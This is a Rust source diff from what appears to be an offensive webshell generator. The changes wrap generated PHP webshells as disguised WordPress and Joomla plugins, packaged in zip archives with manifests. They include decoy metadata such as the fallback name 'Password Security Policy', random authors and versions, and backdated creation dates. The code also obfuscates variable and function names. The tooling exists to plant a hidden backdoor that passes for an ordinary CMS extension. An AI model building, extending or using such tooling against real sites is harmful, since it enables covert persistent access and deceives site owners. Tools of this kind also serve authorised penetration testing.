@@ -125,7 +125,7 @@ impl<'a> Generator<'a> {
 
 		if self.args.obfuscation.obfuscate {
 			info!("Obfuscating ...");
-			self.obfuscate();
+			self.obfuscate(false);
 			info!(
 				"Obfuscation completed (size: {}, reduction: {:.2}%)",
 				pretty_print_filesize(self.code.len() as u64),
@@ -150,44 +150,44 @@ impl<'a> Generator<'a> {
 				self.write_webshell()?;
 			}
 			Some(cms) => {
-				/*match cms {
+				match cms {
 					PhpCms::Wordpress => {
 						info!("Generating WordPress webshell ...");
 
-						if cms_path.is_none() {
+						if self.cms_path.is_none() {
 							return Err(anyhow::anyhow!("Inconsistent state, the WordPress template path is not set. WordPress webshell generation failed."));
 						}
 
-						let plugin_path = cms_path.unwrap().join("template.php");
-						let mut plugin_code = std::fs::read_to_string(plugin_path.clone())
+						let plugin_path = self.cms_path.as_ref().unwrap().join("template.php");
+						let plugin_code = fs::read_to_string(plugin_path.clone())
 							.with_context(|| format!("Could not read the WordPress plugin code file at {}", &plugin_path.display()))?;
 
 						// Remove the PHP opening tag from the shell code as it is already present in the plugin code
-						code = code.trim_start_matches("<?php").to_string();
+						self.code = self.code.trim_start_matches("<?php").to_string();
 
 						// Insert the webshell code into the plugin code
-						plugin_code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &code);
+						self.code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &self.code);
 
 						// Strip all comments from the plugin code
-						if !args.obfuscation.minify {
-							plugin_code = strip_comments(&plugin_code);
+						if !self.args.obfuscation.minify {
+							self.strip_comments();
 						} else {
-							plugin_code = minify(&plugin_code);
+							self.minify();
 						}
 
-						if args.obfuscation.obfuscate {
-							plugin_code = obfuscate(&plugin_code, &args.obfuscation, &functions_prefix);
+						if self.args.obfuscation.obfuscate {
+							self.obfuscate(false);
 						}
 
 						// load the CMS options
-						let plugin_info = parse_cms_options(php_args);
-						let fallback_info = make_wordpress_fallback_info();
+						let plugin_info = self.parse_cms_options(self.php_args);
+						let fallback_info = self.make_wordpress_fallback_info();
 
 						// Get the plugin name from the plugin information or the fallback information
 						let plugin_name = plugin_info.get("__PLUGIN_NAME__").unwrap_or(fallback_info.get("__PLUGIN_NAME__").unwrap());
 
 						// Insert the plugin information into the plugin code
-						plugin_code.insert_str(
+						self.code.insert_str(
 							5,
 							&format!(
 								"
@@ -203,24 +203,24 @@ impl<'a> Generator<'a> {
 								plugin_info.get("__PLUGIN_DESCRIPTION__").unwrap_or(fallback_info.get("__PLUGIN_DESCRIPTION__").unwrap()),
 								plugin_info.get("__PLUGIN_VERSION__").unwrap_or(fallback_info.get("__PLUGIN_VERSION__").unwrap()),
 								plugin_info.get("__PLUGIN_AUTHOR__").unwrap_or(fallback_info.get("__PLUGIN_AUTHOR__").unwrap()),
-								php_args.template_version.to_string()
-								        .split("&")
-								        .collect::<Vec<&str>>()
-								        .get(0)
-								        .unwrap()
-								        .replace("PHP >=", "")
-								        .trim()
+								self.php_args.template_version.to_string()
+								    .split("&")
+								    .collect::<Vec<&str>>()
+								    .get(0)
+								    .unwrap()
+								    .replace("PHP >=", "")
+								    .trim()
 							),
 						);
 
 						// Replace the missing with the previously defined prefix
-						plugin_code = plugin_code.replace("__PREFIX__", functions_prefix.as_str());
+						self.code = self.code.replace("__PREFIX__", self.function_prefix.value.as_str());
 
 						// Write the webshell as a WordPress plugin archive if the plugin mode is enabled or not in standalone mode
-						if php_args.plugin || !php_args.standalone {
+						if self.php_args.plugin || !self.php_args.standalone {
 							info!("Generating WordPress plugin archive ...");
 
-							let mut plugin_archive_path = match &args.output {
+							let mut plugin_archive_path = match &self.args.output {
 								Some(output) => PathBuf::from(output),
 								None => PathBuf::from("plugin.zip"),
 							};
@@ -232,7 +232,7 @@ impl<'a> Generator<'a> {
 
 							// Create the plugin archive
 							let mut zip = zip::ZipWriter::new(
-								std::fs::File::create(&plugin_archive_path)
+								fs::File::create(&plugin_archive_path)
 									.with_context(|| format!("Could not create the plugin archive file: {}", plugin_archive_path.display()))?
 							);
 
@@ -243,7 +243,7 @@ impl<'a> Generator<'a> {
 							// Add the plugin code to the archive
 							zip.start_file(format!("{plugin_name}/plugin.php"), options)
 							   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
-							zip.write_all(plugin_code.as_bytes())
+							zip.write_all(self.code.as_bytes())
 							   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;
 
 							zip.finish()
@@ -253,8 +253,8 @@ impl<'a> Generator<'a> {
 						}
 
 						// Write the webshell to the output file if not generating a plugin archive or in standalone mode
-						if php_args.standalone || !php_args.plugin {
-							let mut output_path = match &args.output {
+						if self.php_args.standalone || !self.php_args.plugin {
+							let mut output_path = match &self.args.output {
 								Some(output) => PathBuf::from(output),
 								None => PathBuf::from("plugin.php"),
 							};
@@ -264,26 +264,127 @@ impl<'a> Generator<'a> {
 								output_path.set_extension("php");
 							}
 
-							std::fs::write(&output_path, plugin_code)
+							fs::write(&output_path, &self.code)
 								.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;
 
 							info!("Webshell written to {}", output_path.display());
 						}
 
 						info!("Plugin Name: {}", plugin_name);
-						info!("Username: {}", args.security.username.as_ref().unwrap());
-						info!("Password: {}", args.security.password.as_ref().unwrap());
-						info!("Enjoy your webshell!");
 					}
 					PhpCms::Joomla => {
-						error!("Joomla is not implemented yet. Exiting ...");
-						unimplemented!("Joomla is not implemented yet");
+						info!("Generating Joomla webshell ...");
+
+						if self.cms_path.is_none() {
+							return Err(anyhow::anyhow!("Inconsistent state, the Joomla template path is not set. Joomla webshell generation failed."));
+						}
+
+						let plugin_path = self.cms_path.as_ref().unwrap().join("template.php");
+						let plugin_code = fs::read_to_string(plugin_path.clone())
+							.with_context(|| format!("Could not read the Joomla plugin code file at {}", &plugin_path.display()))?;
+
+						// Remove the PHP opening tag from the shell code as it is already present in the plugin code
+						self.code = self.code.trim_start_matches("<?php").to_string();
+
+						// Insert the webshell code into the plugin code
+						self.code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &self.code);
+
+						// Strip all comments from the plugin code
+						if !self.args.obfuscation.minify {
+							self.strip_comments();
+						} else {
+							self.minify();
+						}
+
+						// load the CMS options
+						let mut plugin_info = self.parse_cms_options(self.php_args);
+						let fallback_info = self.make_joomla_fallback_info();
+
+						// Get the plugin name from the plugin information or the fallback information
+						let plugin_name = plugin_info.get("__PLUGIN_NAME__").unwrap_or(fallback_info.get("__PLUGIN_NAME__").unwrap());
+						let plugin_snake_case = plugin_name.to_lowercase().replace(" ", "_");
+
+						self.code = self.code.replace("__PLUGIN_NAME_SNAKE__", format!("_{} ", plugin_snake_case.as_str()).as_str());
+
+						let joomla_config_path = self.cms_path.as_ref().unwrap().join("joomla.xml");
+						let mut plugin_config = fs::read_to_string(joomla_config_path.clone())
+							.with_context(|| format!("Could not read the Joomla plugin config file at {}", joomla_config_path.display()))?;
+
+						// Insert the plugin information into the plugin code
+						plugin_config = plugin_config.replace("__PLUGIN_NAME__", plugin_name)
+						                             .replace("__PLUGIN_DESCRIPTION__", plugin_info.get("__PLUGIN_DESCRIPTION__").unwrap_or(fallback_info.get("__PLUGIN_DESCRIPTION__").unwrap()))
+						                             .replace("__PLUGIN_VERSION__", plugin_info.get("__PLUGIN_VERSION__").unwrap_or(fallback_info.get("__PLUGIN_VERSION__").unwrap()))
+						                             .replace("__CREATION_DATE__", plugin_info.get("__CREATION_DATE__").unwrap_or(fallback_info.get("__CREATION_DATE__").unwrap()))
+						                             .replace("__PLUGIN_NAME_SNAKE__", plugin_snake_case.as_str());
+
+						// Write the webshell as a Joomla plugin archive if the plugin mode is enabled or not in standalone mode
+						if self.php_args.plugin || !self.php_args.standalone {
+							info!("Generating Joomla plugin archive ...");
+
+							let mut plugin_archive_path = match &self.args.output {
+								Some(output) => PathBuf::from(output),
+								None => PathBuf::from("plugin.zip"),
+							};
+
+							// Set the output path to the plugin archive
+							if !plugin_archive_path.ends_with(".zip") {
+								plugin_archive_path.set_extension("zip");
+							}
+
+							// Create the plugin archive
+							let mut zip = zip::ZipWriter::new(
+								fs::File::create(&plugin_archive_path)
+									.with_context(|| format!("Could not create the plugin archive file: {}", plugin_archive_path.display()))?
+							);
+
+							let options = zip::write::SimpleFileOptions::default()
+								.compression_method(zip::CompressionMethod::Deflated)
+								.unix_permissions(0o777);
+
+							// Add the plugin code to the archive
+							zip.start_file(format!("{plugin_snake_case}/{plugin_snake_case}.php"), options)
+							   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
+							zip.write_all(self.code.as_bytes())
+							   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;
+
+							// Add the plugin config to the archive
+							zip.start_file(format!("{plugin_snake_case}/joomla.xml"), options)
+							   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
+							zip.write_all(plugin_config.as_bytes())
+							   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;
+
+							zip.finish()
+							   .with_context(|| format!("Could not finish the plugin archive: {}", plugin_archive_path.display()))?;
+
+							info!("Joomla plugin archive generated successfully: {}", plugin_archive_path.display());
+						}
+
+						// Write the webshell to the output file if not generating a plugin archive or in standalone mode
+						if self.php_args.standalone || !self.php_args.plugin {
+							let mut output_path = match &self.args.output {
+								Some(output) => PathBuf::from(output),
+								None => PathBuf::from("plugin.php"),
+							};
+
+							// Set the output path to the plugin archive
+							if !output_path.ends_with(".php") {
+								output_path.set_extension("php");
+							}
+
+							fs::write(&output_path, &self.code)
+								.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;
+
+							warn!("No manifest is created in standalone mode, consider switching to `plugin` mode");
+							info!("Webshell written to {}", output_path.display());
+						}
+
+						info!("Plugin Name: {}", plugin_name);
 					}
 					PhpCms::Drupal => {
 						error!("Drupal is not implemented yet. Exiting ...");
 						unimplemented!("Drupal is not implemented yet");
 					}
-				}*/
+				}
 			}
 		}
 
@@ -334,7 +435,7 @@ impl<'a> Generator<'a> {
 	fn strip_comments(&mut self) {
 		// Regex patterns for line comments (// ...) and multiline comments (/* ... */) in PHP
 		let comments_patters = Regex::new(
-			r#"((?<![:"(]|\w )\/\/(?! - do not remove - | - DO NOT REMOVE - ).*\s*|\/\*(.|\s)*?\*\/\s*)"#
+			r#"((?<![:"(]|\w )\/\/(?! - do not remove - | - DO NOT REMOVE - |").*\s*|\/\*(.|\s)*?\*\/\s*)"#
 		).unwrap();
 
 		// Remove comments
@@ -396,171 +497,6 @@ impl<'a> Generator<'a> {
 		}
 	}
 
-	/// Obfuscate all the duplicated function calls in the PHP code creating global variables and importing them
-	fn obfuscate_duplicated_function_calls(&mut self) {
-		// Parse and analyze PHP code to identify repeated function calls ex. function_name(arguments)
-		let function_name_regex = Regex::new(r#"(?<!function)(?>\s+)(\w+)(\((?>.|\s)*?\))"#).unwrap();
-		let immutable_code_ref = self.code.clone();
-		let captures = function_name_regex.captures_iter(&immutable_code_ref);
-
-		// array of tuples containing the function name and its arguments
-		let mut function_calls = vec![];
-
-		for capture in captures {
-			if let Ok(capture) = capture {
-				let function_name = capture.get(1).unwrap().as_str();
-				let arguments = capture.get(2).unwrap().as_str();
-
-				// Skip the function that are whitelisted for existence
-				if [
-					"array",
-				].contains(&function_name) {
-					continue;
-				}
-
-				function_calls.push((function_name, arguments));
-			}
-		}
-
-		debug!("Detected function calls: {:?}", function_calls);
-		info!("Detected function calls (count: {})", function_calls.len());
-
-		// Identify repeated function calls and generate a replacement for them
-		let mut candidate_to_replacement = HashMap::new();
-		for (function_name, arguments) in &function_calls {
-			// Skip the function if it is already in the replacement map
-			if (candidate_to_replacement.contains_key(function_name)) {
-				continue;
-			}
-
-			let mut count = 0;
-			// Count the number of times the function is called
-			function_calls.iter().filter(|(f, _)| f == function_name).for_each(|_| count += 1);
-
-			// If the function is called more than twice, generate a replacement for it
-			if count > 2 {
-				candidate_to_replacement.insert(
-					*function_name,
-					(
-						count,
-						generate_random_string(self.args.obfuscation.obfuscation_function_format.as_str()).unwrap()
-					),
-				);
-			}
-		}
-
-		debug!("candidate_to_replacement: {:?}", candidate_to_replacement);
-		info!("Duplicated function calls detected (count: {})", candidate_to_replacement.len());
-		info!("Generating global variable aliases for the duplicated function calls ...");
-
-		// Generate global variable aliases for repeated function calls and replace all function calls with the aliases
-		for (function_name, (_, substitution)) in candidate_to_replacement.iter() {
-			let global_alias = format!("${}", substitution);
-			let alias_declaration = format!("{} = \"{}\";\n", global_alias, function_name);
-
-			let replacement_function_name_regex = Regex::new(format!(r#"((?<!function)(?>\s+)){}(\((?>.|\s)*?\))"#, function_name).as_str()).unwrap();
-			// ---------------------------------------------------------|caps[1]-------------|--|caps[2]-------|
-			// Replace all occurrences of the function name with the global alias
-			self.code = replacement_function_name_regex.replace_all(
-				&self.code,
-				|caps: &Captures| format!("{}{}{}", &caps[1], &global_alias, &caps[2]),
-			).to_string();
-
-			// Insert the global alias declaration at the beginning of the PHP code
-			self.code.insert_str(self.code.find("<?php").unwrap() + 5 + 1, &alias_declaration); // +5 for the length of "<?php" and +1 for the space or newline
-		}
-
-		// function definition split into name and body this allows for the definition of the global imports
-		// immediately at the beginning of the function
-		let regex = Regex::new(r#"(function\s+\w+\((?>.|\s)*?\)\s*{)((?>.|\s)*?})"#).unwrap();
-		// immutable copy of the whole code to allow direct code modification while keeping the state of the regex
-		let immutable_code_ref = self.code.clone();
-		let captures = regex.captures_iter(immutable_code_ref.as_str());
-
-		for capture in captures {
-			if let Ok(capture) = capture {
-				let function_declaration = capture.get(1).unwrap().as_str();
-				let mut function_body = capture.get(2).unwrap().as_str();
-
-				// NOTE: The following implementation to extract the function body is not the most efficient nor the most
-				//       error proof, one assumption that it's supposed to always be true is that the function body
-				//       is always enclosed by brackets, and that no brackets are present as a text in the function body
-				//       this may not be the case in all PHP code.
-				//       Consider encoding in some way any brackets that are present in the function body to avoid any
-				//       issue.
-				//
-				//       Possible improvement? AST parsing of the PHP code to extract the function body, this would also
-				//       allow for a more accurate extraction of the function body and the function declaration, reducing
-				//       the number of regexes needed.
-
-				// count the number of open and close brackets in the function body to understand the function boundaries
-				let mut count_open_bracket = function_body.chars().filter(|&c| c == '{').count() + 1; // +1 for the function declaration
-				let mut count_close_bracket = function_body.chars().filter(|&c| c == '}').count();
-				// find the end of the function declaration
-				let function_declaration_index = self.code.find(function_declaration).unwrap() + function_declaration.len();
-				// iterate until the number of open brackets is equal to the number of close brackets, this is the function body
-				while count_open_bracket != count_close_bracket {
-					// find the index of the function body starting from the end of the function declaration
-					let function_body_index = self.code[function_declaration_index..].find(function_body).unwrap_or(0) + function_body.len();
-					// find the index of the next closed bracket starting from the end of the function body
-					let next_closed_bracket_index = self.code[function_declaration_index + function_body_index..].find('}').unwrap_or(0);
-
-					// extract the new function body
-					function_body = &self.code[function_declaration_index..=function_declaration_index + function_body_index + next_closed_bracket_index];
-
-					// update the number of open and close brackets
-					count_open_bracket = function_body.chars().filter(|&c| c == '{').count() + 1; // +1 for the function declaration
-					count_close_bracket = function_body.chars().filter(|&c| c == '}').count();
-				}
-
-				// global imports for the function
-				let mut global_imports = vec![];
-				// replacement for the function body
-				let mut function_body_replacement = function_body.clone().to_string();
-
-				for (_, (_, function_name)) in candidate_to_replacement.iter() {
-					// if the function body contains the function name, add it to the global imports
-					if function_body.contains(format!("${}(", function_name).as_str()) {
-						global_imports.push(format!("${}", function_name));
-					}
-				}
-
-				// regex to match global variable declarations, ex. global $var1,$var2, $var3;
-				let globals_regex = Regex::new(r#"global\s+((?>\$\w+,?\s*)+?);"#).unwrap();
-				let globals_captures = globals_regex.captures_iter(&function_body);
-
-				for capture in globals_captures {
-					if let Ok(capture) = capture {
-						// extract the global variables and remove them from the function body
-						let globals = capture.get(1).unwrap().as_str();
-						function_body_replacement = globals_regex.replace_all(&function_body_replacement, "").to_string();
-
-						// then split the global variables and add them to the global imports
-						let globals_replacement = globals.split(",").map(|g| g.trim().to_string()).collect::<Vec<String>>();
-						global_imports.extend(globals_replacement);
-					}
-				}
-
-				debug!("global_imports: {:?}", global_imports);
-
-				// if there are no global imports, skip the function
-				if (global_imports.is_empty()) {
-					continue;
-				}
-
-				// generate the global imports declaration and insert it at the beginning of the function body
-				let global_imports_declaration = format!("\nglobal {};", global_imports.join(","));
-				function_body_replacement.insert_str(0, &global_imports_declaration);
-
-				// replace the function definition with the new one
-				self.code = self.code.replace(
-					format!("{}{}", function_declaration, function_body).as_str(),
-					format!("{}{}", function_declaration, function_body_replacement).as_str(),
-				);
-			}
-		}
-	}
-
 	/// Obfuscate the PHP variable names
 	fn obfuscate_variable_names(&mut self) {
 		let all_var_definitions = extract_unique_strings(&self.code, r#"\$\w+"#);
@@ -618,10 +554,9 @@ impl<'a> Generator<'a> {
 	/// Obfuscate a PHP code
 	///
 	/// This function will obfuscate the variable names and function names in the code
-	fn obfuscate(&mut self) {
+	fn obfuscate(&mut self, bypass_duplicate_obfuscation: bool) {
 		self.obfuscate_variable_names();
 		self.obfuscate_function_names();
-		self.obfuscate_duplicated_function_calls();
 	}
 
 	/// Apply the substitutions to the PHP template
@@ -836,8 +771,20 @@ impl<'a> Generator<'a> {
 
 						if level_1_parent.file_name().unwrap().to_str().unwrap() == "features" ||
 							level_1_parent.parent().unwrap().file_name().unwrap().to_str().unwrap() == "features" {
+
+							let filename = if level_1_parent.file_name().unwrap().to_str().unwrap() == "features" {
+								entry.file_stem().unwrap().to_str().unwrap().to_string()
+							} else {
+								format!("{}/{}", level_1_parent.file_name().unwrap().to_str().unwrap(), entry.file_stem().unwrap().to_str().unwrap())
+							};
+
 							// main/grouped feature found, load it
-							self.features.push(PhpFeature::new(entry));
+							if self.php_args.exclude_features.contains(&filename) {
+								warn!("Feature file '{}' excluded from loading", filename);
+							} else {
+								info!("Feature file found: '{}'", filename);
+								self.features.push(PhpFeature::new(entry));
+							}
 						} else {
 							warn!("Feature file found in an unexpected location: '{}'. This won't be loaded.", entry.display());
 						}
@@ -916,10 +863,8 @@ impl<'a> Generator<'a> {
 			Some(cms) => {
 				match cms {
 					PhpCms::Wordpress => Some(self.base_template_path.join("wordpress/wp-content/plugins/webshell")),
-
-					// TODO: Implement Joomla and Drupal
-					PhpCms::Joomla => unimplemented!(),
-					PhpCms::Drupal => unimplemented!(),
+					PhpCms::Joomla => Some(self.base_template_path.join("joomla/tmp/webshell")),
+					PhpCms::Drupal => Some(self.base_template_path.join("drupal/modules/webshell")),
 				}
 			}
 		};
@@ -940,226 +885,72 @@ impl<'a> Generator<'a> {
 			PhpVersion::_80 => "8.x",
 		}
 	}
-}
 
-/// Generate a PHP webshell
-///
-/// # Arguments
-/// * `args` - The CLI arguments
-/// * `php_args` - The PHP template arguments
-///
-/// # Returns
-///
-/// An empty `anyhow::Result` if the webshell was generated successfully, an error otherwise
-pub fn generate_php_webshell(args: &CliGenerateArguments, php_args: &CliGeneratePhpTemplate) -> anyhow::Result<()> {
-	/*
+	/// Generate random information for a WordPress plugin
+	///
+	/// This function will generate random information for a WordPress plugin to be used as fallback if the CMS options are
+	/// not provided
+	///
+	/// # Returns
+	///
+	/// A HashMap containing the WordPress plugin information
+	fn make_wordpress_fallback_info(&self) -> HashMap<String, String> {
+		let mut fallback_info = HashMap::<String, String>::new();
 
-	match php_args.cms {
-		None => {
-			let mut output_path = match &args.output {
-				Some(output) => PathBuf::from(output),
-				None => PathBuf::from("shell.php"),
-			};
+		fallback_info.insert("__PLUGIN_NAME__".to_string(), generate_random_string(r"\w{10}").unwrap());
+		fallback_info.insert("__PLUGIN_DESCRIPTION__".to_string(), generate_random_string(r"\w{20}").unwrap());
+		fallback_info.insert("__PLUGIN_VERSION__".to_string(), generate_random_string(r"\d\.\d\.\d").unwrap());
+		fallback_info.insert("__PLUGIN_AUTHOR__".to_string(), generate_random_string(r"\w{5}").unwrap());
 
-			// Set the output path to the plugin archive
-			if !output_path.ends_with(".php") {
-				output_path.set_extension("php");
-			}
-
-			std::fs::write(&output_path, code)
-				.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;
-
-			info!("Webshell written to {}", output_path.display());
-			info!("Username: {}", args.security.username.as_ref().unwrap());
-			info!("Password: {}", args.security.password.as_ref().unwrap());
-			info!("Enjoy your webshell!");
-		}
-		Some(cms) => {
-			match cms {
-				PhpCms::Wordpress => {
-					info!("Generating WordPress webshell ...");
-
-					if cms_path.is_none() {
-						return Err(anyhow::anyhow!("Inconsistent state, the WordPress template path is not set. WordPress webshell generation failed."));
-					}
-
-					let plugin_path = cms_path.unwrap().join("template.php");
-					let mut plugin_code = std::fs::read_to_string(plugin_path.clone())
-						.with_context(|| format!("Could not read the WordPress plugin code file at {}", &plugin_path.display()))?;
-
-					// Remove the PHP opening tag from the shell code as it is already present in the plugin code
-					code = code.trim_start_matches("<?php").to_string();
-
-					// Insert the webshell code into the plugin code
-					plugin_code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &code);
-
-					// Strip all comments from the plugin code
-					if !args.obfuscation.minify {
-						plugin_code = strip_comments(&plugin_code);
-					} else {
-						plugin_code = minify(&plugin_code);
-					}
-
-					if args.obfuscation.obfuscate {
-						plugin_code = obfuscate(&plugin_code, &args.obfuscation, &functions_prefix);
-					}
-
-					// load the CMS options
-					let plugin_info = parse_cms_options(php_args);
-					let fallback_info = make_wordpress_fallback_info();
-
-					// Get the plugin name from the plugin information or the fallback information
-					let plugin_name = plugin_info.get("__PLUGIN_NAME__").unwrap_or(fallback_info.get("__PLUGIN_NAME__").unwrap());
-
-					// Insert the plugin information into the plugin code
-					plugin_code.insert_str(
-						5,
-						&format!(
-							"
-/*
- * Plugin Name: {}
- * Description: {}
- * Version: {}
- * Author: {}
- * Requires PHP: {}
- */
- ",
-							plugin_name,
-							plugin_info.get("__PLUGIN_DESCRIPTION__").unwrap_or(fallback_info.get("__PLUGIN_DESCRIPTION__").unwrap()),
-							plugin_info.get("__PLUGIN_VERSION__").unwrap_or(fallback_info.get("__PLUGIN_VERSION__").unwrap()),
-							plugin_info.get("__PLUGIN_AUTHOR__").unwrap_or(fallback_info.get("__PLUGIN_AUTHOR__").unwrap()),
-							php_args.template_version.to_string()
-							        .split("&")
-							        .collect::<Vec<&str>>()
-							        .get(0)
-							        .unwrap()
-							        .replace("PHP >=", "")
-							        .trim()
-						),
-					);
-
-					// Replace the missing with the previously defined prefix
-					plugin_code = plugin_code.replace("__PREFIX__", functions_prefix.as_str());
-
-					// Write the webshell as a WordPress plugin archive if the plugin mode is enabled or not in standalone mode
-					if php_args.plugin || !php_args.standalone {
-						info!("Generating WordPress plugin archive ...");
-
-						let mut plugin_archive_path = match &args.output {
-							Some(output) => PathBuf::from(output),
-							None => PathBuf::from("plugin.zip"),
-						};
-
-						// Set the output path to the plugin archive
-						if !plugin_archive_path.ends_with(".zip") {
-							plugin_archive_path.set_extension("zip");
-						}
-
-						// Create the plugin archive
-						let mut zip = zip::ZipWriter::new(
-							std::fs::File::create(&plugin_archive_path)
-								.with_context(|| format!("Could not create the plugin archive file: {}", plugin_archive_path.display()))?
-						);
-
-						let options = zip::write::SimpleFileOptions::default()
-							.compression_method(zip::CompressionMethod::Deflated)
-							.unix_permissions(0o777);
-
-						// Add the plugin code to the archive
-						zip.start_file(format!("{plugin_name}/plugin.php"), options)
-						   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
-						zip.write_all(plugin_code.as_bytes())
-						   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;
-
-						zip.finish()
-						   .with_context(|| format!("Could not finish the plugin archive: {}", plugin_archive_path.display()))?;
-
-						info!("WordPress plugin archive generated successfully: {}", plugin_archive_path.display());
-					}
-
-					// Write the webshell to the output file if not generating a plugin archive or in standalone mode
-					if php_args.standalone || !php_args.plugin {
-						let mut output_path = match &args.output {
-							Some(output) => PathBuf::from(output),
-							None => PathBuf::from("plugin.php"),
-						};
-
-						// Set the output path to the plugin archive
-						if !output_path.ends_with(".php") {
-							output_path.set_extension("php");
-						}
-
-						std::fs::write(&output_path, plugin_code)
-							.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;
-
-						info!("Webshell written to {}", output_path.display());
-					}
-
-					info!("Plugin Name: {}", plugin_name);
-					info!("Username: {}", args.security.username.as_ref().unwrap());
-					info!("Password: {}", args.security.password.as_ref().unwrap());
-					info!("Enjoy your webshell!");
-				}
-				PhpCms::Joomla => {
-					error!("Joomla is not implemented yet. Exiting ...");
-					unimplemented!("Joomla is not implemented yet");
-				}
-				PhpCms::Drupal => {
-					error!("Drupal is not implemented yet. Exiting ...");
-					unimplemented!("Drupal is not implemented yet");
-				}
-			}
-		}
-	}*/
-
-	Ok(())
-}
-
-/// Generate random information for a WordPress plugin
-///
-/// This function will generate random information for a WordPress plugin to be used as fallback if the CMS options are
-/// not provided
-///
-/// # Returns
-///
-/// A HashMap containing the WordPress plugin information
-fn make_wordpress_fallback_info() -> HashMap<String, String> {
-	let mut fallback_info = HashMap::<String, String>::new();
-
-	fallback_info.insert("__PLUGIN_NAME__".to_string(), generate_random_string(r"\w{10}").unwrap());
-	fallback_info.insert("__PLUGIN_DESCRIPTION__".to_string(), generate_random_string(r"\w{20}").unwrap());
-	fallback_info.insert("__PLUGIN_VERSION__".to_string(), generate_random_string(r"\d\.\d\.\d").unwrap());
-	fallback_info.insert("__PLUGIN_AUTHOR__".to_string(), generate_random_string(r"\w{5}").unwrap());
-
-	fallback_info
-}
-
-/// Parse the CMS options
-///
-/// This function will parse the CMS options passed as arguments and return them as a HashMap
-///
-/// # Arguments
-///
-/// * `args` - The CLI arguments
-///
-/// # Returns
-///
-/// A HashMap containing the CMS options
-fn parse_cms_options(args: &CliGeneratePhpTemplate) -> HashMap<String, String> {
-	let mut cms_options = HashMap::<String, String>::new();
-
-	for option in args.cms_option.iter() {
-		let key_value: Vec<&str> = option.split('=').collect();
-
-		if key_value.len() != 2 {
-			warn!("Invalid CMS option: {}, value discarded", option);
-			continue;
-		}
-
-		cms_options.insert(key_value[0].to_string(), key_value[1].to_string());
+		fallback_info
 	}
 
-	debug!("CMS options parsed: {:?}", cms_options);
+	/// Generate random information for a Joomla plugin
+	///
+	/// This function will generate random information for a Joomla plugin to be used as fallback if the CMS options are
+	/// not provided
+	///
+	/// # Returns
+	///
+	/// A HashMap containing the WordPress plugin information
+	fn make_joomla_fallback_info(&self) -> HashMap<String, String> {
+		let mut fallback_info = HashMap::<String, String>::new();
 
-	cms_options
+		fallback_info.insert("__PLUGIN_NAME__".to_string(), r"Password Security Policy".to_string());
+		fallback_info.insert("__PLUGIN_DESCRIPTION__".to_string(), generate_random_string(r"\w{25}").unwrap());
+		fallback_info.insert("__PLUGIN_VERSION__".to_string(), generate_random_string(r"\d\.\d\.\d").unwrap());
+		fallback_info.insert("__CREATION_DATE__".to_string(), generate_random_string(r"0\d/0\d/201\d").unwrap());
+
+		fallback_info
+	}
+
+	/// Parse the CMS options
+	///
+	/// This function will parse the CMS options passed as arguments and return them as a HashMap
+	///
+	/// # Arguments
+	///
+	/// * `args` - The CLI arguments
+	///
+	/// # Returns
+	///
+	/// A HashMap containing the CMS options
+	fn parse_cms_options(&self, args: &CliGeneratePhpTemplate) -> HashMap<String, String> {
+		let mut cms_options = HashMap::<String, String>::new();
+
+		for option in args.cms_option.iter() {
+			let key_value: Vec<&str> = option.split('=').collect();
+
+			if key_value.len() != 2 {
+				warn!("Invalid CMS option: {}, value discarded", option);
+				continue;
+			}
+
+			cms_options.insert(key_value[0].to_string(), key_value[1].to_string());
+		}
+
+		debug!("CMS options parsed: {:?}", cms_options);
+
+		cms_options
+	}
 }
